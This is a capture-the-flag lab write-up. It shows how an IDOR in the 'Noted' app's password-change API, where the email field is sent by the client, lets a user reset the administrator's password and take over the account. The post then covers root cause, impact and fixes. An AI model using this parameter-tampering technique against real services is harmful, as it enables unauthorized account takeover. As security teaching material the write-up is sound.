---
title: "Password Change IDOR Leads to Administrator Account Takeover | Noted"
date: 2026-06-07 22:30:00 +0530
categories: [A01 - Broken Access Control, IDOR]
tags: [idor, broken-access-control, account-takeover, password-reset, webverselabs-pro, noted]
author: Shivansh Sharma
image:
  path: /assets/images/posts/noted-password-reset-idor.webp
  alt: "Noted Password Change IDOR"
---

## Lab Link

Lab: [Noted](https://dashboard.webverselabs-pro.com/mystery-challenges/noted)

## Overview

Noted is a collaboration platform used for meeting notes, summaries, and workspace management. While exploring the application, an insecure password change mechanism was discovered that allowed users to modify passwords for arbitrary accounts.

By changing the email parameter during a password update request, it was possible to reset the administrator's password and gain access to the internal administration area.

## Objective

Take over the administrator account and access the internal admin panel.

## Vulnerability Identification

### Classification Hierarchy

```text
A01 - Broken Access Control
└── Insecure Direct Object Reference (IDOR)
    └── Unauthorized Password Modification
        └── Account Takeover
```

The application trusted a user-supplied email parameter when processing password changes and failed to verify ownership of the target account.

## Reconnaissance

While exploring the application, the help page disclosed an internal administrator account.

```bash
/help
```

Administrator email:

```text
admin@noted.local
```

A normal user account was then created.

```bash
/register
```

After logging in, the account security settings were available at:

```bash
/app/settings/security
```

The page allowed authenticated users to change their password.

## Exploitation

Changing the account password generated the following API request:

```http
POST /api/change-pass
```

Request parameters:

```json
{
  "email": "user@example.com",
  "newpass": "password123"
}
```

The request relied on a client-controlled email parameter.

Instead of using the current user's email address, the request was modified to target the administrator account discovered earlier.

Modified request:

```json
{
  "email": "admin@noted.local",
  "newpass": "<new_password>"
}
```

The server responded:

```json
{
  "email":"admin@noted.local",
  "status":"ok"
}
```

The response confirmed that the password change operation had been applied to the administrator account.

## Proof of Exploitation

After resetting the administrator password, authentication was attempted using the new credentials.

```text
admin@noted.local : <new_password>
```

Login succeeded.

The administrative area was then accessible at:

```bash
/admin
```

Access to the internal administrator functionality confirmed successful account takeover.

Flag:

```text
WEBVERSE{REDACTED}
```

The challenge is successfully solved.

## Root Cause Analysis

The password change endpoint trusted a user-supplied identifier when determining which account should be modified.

Instead of deriving the account from the authenticated session, the application accepted an arbitrary email address from the client and performed the password update directly.

Because no ownership verification was performed, any authenticated user could modify the password of any account simply by changing the email parameter.

## Impact

Successful exploitation allows attackers to:

* Reset passwords for arbitrary users
* Take over privileged accounts
* Access administrative functionality
* View or modify sensitive data
* Bypass authorization controls
* Fully compromise application security

Severity: **Critical**

## Mitigation

To prevent IDOR vulnerabilities in account management functionality:

* Derive account identity from the authenticated session
* Ignore user-supplied account identifiers for sensitive actions
* Enforce authorization checks on every object access
* Require current password verification before password changes
* Log and monitor account security events
* Implement defense-in-depth validation

Vulnerable pattern:

```javascript
updatePassword(req.body.email, req.body.newpass);
```

Secure pattern:

```javascript
updatePassword(req.user.email, req.body.newpass);
```

## Real-World Insight

IDOR vulnerabilities frequently appear in account management features where developers trust identifiers supplied by the client. Password reset and password change workflows are particularly dangerous because a single authorization failure can result in complete account takeover.

Noted demonstrates a classic Broken Access Control vulnerability where the server correctly authenticates the user but fails to verify whether they are authorized to modify the targeted account.
